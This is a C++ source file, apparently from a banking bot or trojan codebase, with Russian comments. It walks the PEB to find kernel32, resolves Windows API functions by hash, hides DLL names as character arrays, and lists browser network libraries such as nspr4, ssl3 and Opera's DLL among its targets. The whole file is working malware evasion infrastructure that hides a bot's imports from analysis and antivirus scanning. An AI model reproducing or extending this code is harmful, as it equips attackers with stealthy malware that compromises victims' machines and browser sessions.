#include <windows.h>

#include "Getapi.h"
#include "Crypt.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "ntdll.h"


DWORD GetImageBase()
{

	DWORD dwRet = 0;

	DWORD* Addr = (DWORD *)&GetImageBase;

	__asm
	{
			mov EAX, Addr
			and eax, 0FFFF0000h
		find:
			cmp word ptr [ eax ], 0x5A4D
			je end
			sub eax, 00010000h
			JMP find
		end:
			mov [dwRet], eax
	}

	return dwRet;
}


static bool BuildBotImportTable()
{
	unsigned char* imageBase = (unsigned char*)GetImageBase();
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(imageBase))[dosHeader->e_lfanew];

	HMODULE kernel32 ;
	PVOID (WINAPI*_pGetProcAddress)(HMODULE,PCHAR) ;
	PVOID (WINAPI*_pLoadLibraryA)(PCHAR) ;
	
	PIMAGE_DATA_DIRECTORY directory = (PIMAGE_DATA_DIRECTORY)&header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	
	if ( directory->Size <= 0 )
		return false;

	if ( (kernel32 = GetKernel32()) == NULL)
		return false;

	_pGetProcAddress = ( PVOID (WINAPI*)(HMODULE,PCHAR) ) GetApiAddr( kernel32, 0x1FC0EAEE );
	_pLoadLibraryA = ( PVOID (WINAPI*)(PCHAR) ) GetApiAddr( kernel32, 0xC8AC8026 );
	if ( (_pGetProcAddress == NULL) | (_pLoadLibraryA == NULL) )
		return 0;

	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + directory->VirtualAddress);

	for ( ; importDesc->Name; importDesc++ )
	{
		DWORD *thunkRef, *funcRef;
		HMODULE handle = (HMODULE)_pLoadLibraryA( (PCHAR)(imageBase + importDesc->Name) );

		if( handle == NULL )
		{
			//	not found dll
			continue;
		}

		if (importDesc->OriginalFirstThunk)
		{
			thunkRef = (DWORD *)(imageBase + importDesc->OriginalFirstThunk);
			funcRef = (DWORD *)(imageBase + importDesc->FirstThunk);
		} 
		else 
		{
			thunkRef = (DWORD *)(imageBase + importDesc->FirstThunk);
			funcRef = (DWORD *)(imageBase + importDesc->FirstThunk);
		}
		
		for (; *thunkRef; thunkRef++, funcRef++)
		{
			DWORD Addr = 0;
			char* nf = 0;
			if IMAGE_SNAP_BY_ORDINAL(*thunkRef)
			{
				Addr = (DWORD)_pGetProcAddress( handle, (PCHAR)IMAGE_ORDINAL(*thunkRef) );
			}
			else
			{
				PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(imageBase + *thunkRef);
				Addr = (DWORD)_pGetProcAddress( handle, (PCHAR)&thunkData->Name );
			}
			if( Addr )
			{
				if( Addr != *funcRef )
					*funcRef = Addr;
			}
			else
			{
				// not found function. call by name
				*funcRef = 0;
			}
		}
	}
	return true;
}

BOOL InitializeAPI()
{
	BuildBotImportTable();
	return true;
}

DWORD pGetLastError()
{
	DWORD dwRet = 0;

	__asm
	{
		MOV EAX,DWORD PTR FS:[18h]
		MOV EAX,DWORD PTR DS:[EAX+34h]
		MOV [dwRet], EAX
	}

	return dwRet;
}

HMODULE GetKernel32(void)
{    
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	PPEB_LDR_DATA LdrData = Peb->Ldr;
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
    PLIST_ENTRY Entry = Head->Flink;

    while ( Entry != Head )
    {
		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    

		WCHAR wcDllName[MAX_PATH];

		m_memset( (char*)wcDllName, 0, sizeof( wcDllName ) );

        m_wcsncpy( wcDllName, LdrData->BaseDllName.Buffer, Min( MAX_PATH - 1, LdrData->BaseDllName.Length / sizeof( WCHAR ) ) );

        if ( CalcHashW( m_wcslwr( wcDllName ) ) == 0x4B1FFE8E )
        {
            return (HMODULE)LdrData->DllBase;
        }

        Entry = Entry->Flink;
    }

    return NULL;
}


HMODULE GetDllBase( DWORD dwDllHash )
{    
	PPEB Peb = NULL;

	__asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	PPEB_LDR_DATA LdrData = Peb->Ldr;
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
	PLIST_ENTRY Entry = Head->Flink;

	while ( Entry != Head )
    {
		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    

		WCHAR wcDllName[MAX_PATH];

		m_memset( (char*)wcDllName, 0, sizeof( wcDllName ) );

		m_wcsncpy( wcDllName, LdrData->BaseDllName.Buffer, Min( MAX_PATH - 1, LdrData->BaseDllName.Length / sizeof( WCHAR ) ) );

		if ( CalcHashW( m_wcslwr( wcDllName ) ) == dwDllHash )
        {
			return (HMODULE)LdrData->DllBase;
        }

        Entry = Entry->Flink;
    }

    return NULL;
}

LPVOID GetForvardedProc(PCHAR Name)
{
	// Функция обработки переназначения экспорта
	// На входе должна быть строка DllName.ProcName или DllName.#ProcNomber
	if (Name == NULL)
 		return NULL;

	char DLLName[255];
	m_memset(DLLName, 0, sizeof(DLLName));

	PCHAR NameStr = STR::Scan(Name, '.');
	if (NameStr == NULL)
		return NULL;

	// Собираем имя библиотеки
	m_memcpy(DLLName, Name, NameStr - Name);

	m_lstrcat(DLLName, ".dll");

	// определяем имя функции
	NameStr++;
	if (*NameStr == '#')
	{
		// Имя является номером функции
		NameStr++;
		DWORD OrdNomber = m_atoi(NameStr);
		return GetProcAddressEx(DLLName, 0, OrdNomber);
	}
	DWORD Hash = CalcHash(NameStr);
	return GetProcAddressEx(DLLName, 0, Hash);
}


LPVOID GetApiAddr(HMODULE Module, DWORD ProcNameHash)
{
	/*----------- Функция возвращает адрем функции по её названию -----------*/

    // Получаем адрес дополнительных PE заголовков
	PIMAGE_OPTIONAL_HEADER poh  = (PIMAGE_OPTIONAL_HEADER)( (char*)Module + ( (PIMAGE_DOS_HEADER)Module)->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));

	// Получаем адрес таблицы експорта
	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module,	poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

    DWORD DataSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	int Ordinal = -1; // Норем необходимой нам функции

	if ( HIWORD(ProcNameHash) == 0 )
	{
		// Ищем функцию по её номеру
		Ordinal = (LOWORD(ProcNameHash)) - Table->Base;
	}
	else
	{
		// Ищем функцию по номеру
		PDWORD NamesTable  = (DWORD*)RVATOVA(Module, Table->AddressOfNames );
		PWORD  OrdinalTable =  (WORD*)RVATOVA(Module, Table->AddressOfNameOrdinals);

		unsigned int i;
		char * ProcName;
		for ( i = 0; i < Table->NumberOfNames; i++)
		{
			ProcName = (char*)RVATOVA(Module, *NamesTable);
			if (CalcHash(ProcName) == ProcNameHash )
			{
				Ordinal = *OrdinalTable;
				break;
			}
			// Увеличиваем позицию в таблице
			NamesTable++;
			OrdinalTable++;
		}
	}

	// не нашли номер
	if (Ordinal < 0)
		return NULL;

	// Определяем адрес функции
	PDWORD AddrTable  = (PDWORD)RVATOVA(Module, Table->AddressOfFunctions);
	DWORD RVA		  = AddrTable[Ordinal];
	DWORD Ret		  = (DWORD)RVATOVA(Module, RVA );

	// проверяем на переназначение экспорта
	if (Ret > (DWORD)Table && (Ret - (DWORD)Table < DataSize))
		Ret = (DWORD)GetForvardedProc((PCHAR)Ret);

	return (LPVOID)Ret;
}


//---------------------------------------------------------------------
//  GetDLLName -  Функция возвращает имя библиотеки
//---------------------------------------------------------------------

namespace DLLS
{
	const static char kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
	const static char advapi32_dll[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
	const static char user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',0};
	const static char ws2_32_dll[]   = {'w','s','2','_','3','2','.','d','l','l',0};
	const static char ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',0};
	const static char winsta_dll[]   = {'w','i','n','s','t','a','.','d','l','l',0};
	const static char shell32_dll[]  = {'s','h','e','l','l','3','2','.','d','l','l',0};
	const static char wininet_dll[]  = {'w','i','n','i','n','e','t','.','d','l','l',0};
	const static char urlmon_dll[]   = {'u','r','l','m','o','n','.','d','l','l',0};
	const static char nspr4_dll[]	 = {'n','s','p','r','4','.','d','l','l',0};
	const static char ssl3_dll[]	 = {'s','s','l','3','.','d','l','l',0};
	const static char winmm_dll[]	 = {'w','i','n','m','m','.','d','l','l',0};
	const static char cabinet_dll[]  = {'c','a','b','i','n','e','t','.','d','l','l',0};
	const static char opera_dll[]	 = {'o','p','e','r','a','.','d','l','l',0};
	const static char gdi32_dll[]    = {'G', 'd', 'i', '3', '2', '.', 'd', 'l', 'l',  0};
	const static char gdiPlus_dll[]  = {'g','d','i','p','l','u','s','.','d','l','l', 0};
	const static char crypt32_dll[]	 = {'c','r','y','p','t','3','2','.','d','l','l',0};
	const static char Iphlpapi_dll[] = {'I','p','h','l','p','a','p','i','.','d','l','l',0};
	const static char winspool_drv[] = {'w','i','n','s','p','o','o','l','.','d','r','v',0};
	const static char odbc32_dll[]    = {'o','d','b','c','3','2','.','d','l','l',0};
	const static char commdlg32_dll[] = {'c','o','m','d','l','g','3','2','.','d','l','l',0};
	const static char psapi_dll[]	  = {'p','s','a','p','i','.','d','l','l',0};
	const static char shlwapi_dll[]	  = {'s','h','l','w','a','p','i','.','d','l','l',0};
}

PCHAR GetDLLName(TDllId ID)
{
	#define Return(Name) return (PCHAR)DLLS::Name

	switch (ID) {
		case DLL_KERNEL32:   Return(kernel32_dll);
		case DLL_ADVAPI32:   Return(advapi32_dll);
		case DLL_USER32:     Return(user32_dll);
		case DLL_WINSOCK:    Return(ws2_32_dll);
		case DLL_NTDLL:      Return(ntdll_dll);
		case DLL_WINSTA:     Return(winsta_dll);
		case DLL_SHELL32:    Return(shell32_dll);
		case DLL_WININET:    Return(wininet_dll);
		case DLL_URLMON:     Return(urlmon_dll);
		case DLL_NSPR4:      Return(nspr4_dll);
		case DLL_SSL3:       Return(ssl3_dll);
		case DLL_WINMM:      Return(winmm_dll);
		case DLL_CABINET:    Return(cabinet_dll);
		case DLL_OPERA:      Return(opera_dll);
		case DLL_GDI:        Return(gdi32_dll);
		case DLL_GDIPLUS:    Return(gdiPlus_dll);
		case DLL_CRYPT32:    Return(crypt32_dll);
		case DLL_PSAPI:      Return(psapi_dll);
		case DLL_SHLWAPI:    Return(shlwapi_dll);
		case DLL_IPHLPAPI:   Return(Iphlpapi_dll);
		case DLL_WINSPOOL:   Return(winspool_drv);
		case DLL_COMANDLG32: Return(commdlg32_dll);
		case DLL_ODBC32:     Return(odbc32_dll);
	}
	return NULL;
}


LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
{

//-----------------------------------------------------------------------------

	// Названия используемых библиотек
	//char kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
	const static char advapi32_dll[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
	const static char user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',0};
	const static char ws2_32_dll[]   = {'w','s','2','_','3','2','.','d','l','l',0};
	const static char ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',0};
	const static char winsta_dll[]   = {'w','i','n','s','t','a','.','d','l','l',0};
	const static char shell32_dll[]  = {'s','h','e','l','l','3','2','.','d','l','l',0};
	const static char wininet_dll[]  = {'w','i','n','i','n','e','t','.','d','l','l',0};
	const static char urlmon_dll[]   = {'u','r','l','m','o','n','.','d','l','l',0};
	const static char nspr4_dll[]	 = {'n','s','p','r','4','.','d','l','l',0};
	const static char ssl3_dll[]	 = {'s','s','l','3','.','d','l','l',0};
	const static char winmm_dll[]	 = {'w','i','n','m','m','.','d','l','l',0};
	const static char cabinet_dll[]  = {'c','a','b','i','n','e','t','.','d','l','l',0};
	const static char opera_dll[]	 = {'o','p','e','r','a','.','d','l','l',0};
	const static char gdi32_dll[]    = {'G', 'd', 'i', '3', '2', '.', 'd', 'l', 'l',  0};
	const static char gdiPlus_dll[]  = {'g','d','i','p','l','u','s','.','d','l','l', 0};
	const static char crypt32_dll[]	 = {'c','r','y','p','t','3','2','.','d','l','l',0};
	const static char Iphlpapi_dll[] = {'I','p','h','l','p','a','p','i','.','d','l','l',0};
	const static char winspool_drv[] = {'w','i','n','s','p','o','o','l','.','d','r','v',0};
	
	const static char odbc32_dll[]    = {'o','d','b','c','3','2','.','d','l','l',0};

	const static char commdlg32_dll[] = {'c','o','m','d','l','g','3','2','.','d','l','l',0};
	char psapi_dll[]	= {'p','s','a','p','i','.','d','l','l',0};
	char shlwapi_dll[]	= {'s','h','l','w','a','p','i','.','d','l','l',0};

	//-----------------------------------------------------------------------
	HMODULE Module = NULL;


	char *DllName = Dll;

	if (DllName == NULL)
	{
		switch ( dwModule ) 
		{
			case 1: 
				Module = GetKernel32();
				break;

			case 2:
				DllName = (PCHAR)advapi32_dll;
				break;

			case 3:
				DllName = (PCHAR)user32_dll;
				break;

			case 4:
				DllName = (PCHAR)ws2_32_dll;
				break;

			case 5:
				DllName = (PCHAR)ntdll_dll;
				break;

			case 6:
				DllName = (PCHAR)winsta_dll;
				break;

			case 7:
				DllName = (PCHAR)shell32_dll;
				break;

			case 8:
				DllName = (PCHAR)wininet_dll;
				break;

			case 9:
				DllName = (PCHAR)urlmon_dll;
				break;

			case 10:
				DllName = (PCHAR)nspr4_dll;
				break;

			case 11:
				DllName = (PCHAR)ssl3_dll;
				break;

			case 12:
				DllName = (PCHAR)winmm_dll;// для вырубания звука
				break;

			case 13:
				DllName = (PCHAR)cabinet_dll;//для архивирования
				break;

			case 14:
				DllName = (PCHAR)opera_dll;//для оперы
				break;

			case DLL_GDI:
				DllName = (PCHAR)gdi32_dll; break;

			case DLL_GDIPLUS:
				DllName = (PCHAR)gdiPlus_dll; break;

			case DLL_CRYPT32:
				DllName = (PCHAR)crypt32_dll; break;

			case DLL_PSAPI:
				DllName = psapi_dll;
			break;
			
			case DLL_SHLWAPI:
				DllName = shlwapi_dll;
			break;

			case DLL_IPHLPAPI:
				DllName = (PCHAR)Iphlpapi_dll;break;

			case DLL_WINSPOOL:
				DllName = (PCHAR)winspool_drv;break;
			
			case DLL_COMANDLG32:
				DllName = (PCHAR)commdlg32_dll;break;

			case DLL_ODBC32:
				DllName = (PCHAR)odbc32_dll;break;
			default:
				return 0;
		}
	}

	
	if (Module == NULL && !STR::IsEmpty(DllName))
	{
		Module = (HMODULE)pGetModuleHandleA(DllName);
		if (Module == NULL)
			Module = (HMODULE)pLoadLibraryA(DllName);
	}

	/*LPVOID ret = (LPVOID)0x00000000; так было ранее

	if (hModule != NULL)
		ret = GetApiAddr( hModule, dwProcNameHash );*/
/***/ // так стало

	if (dwProcNameHash == 0)
		return Module;

	LPVOID ret = GetApiAddr(Module, dwProcNameHash);

	if ( ret == NULL )
		return (LPVOID)0x00000000;

	return ret;
}


//****************************************************************
//  TBotClass - базовый класс бота
//****************************************************************

void* TBotClass::operator new(size_t size)
{
	return HEAP::Alloc(size);
}

void* TBotClass::operator new[](size_t size)
{
	return HEAP::Alloc(size);
}

void  TBotClass::operator delete(void* Pointer)
{
	HEAP::Free(Pointer);
}

void  TBotClass::operator delete[](void* Pointer)
{
	HEAP::Free(Pointer);
}

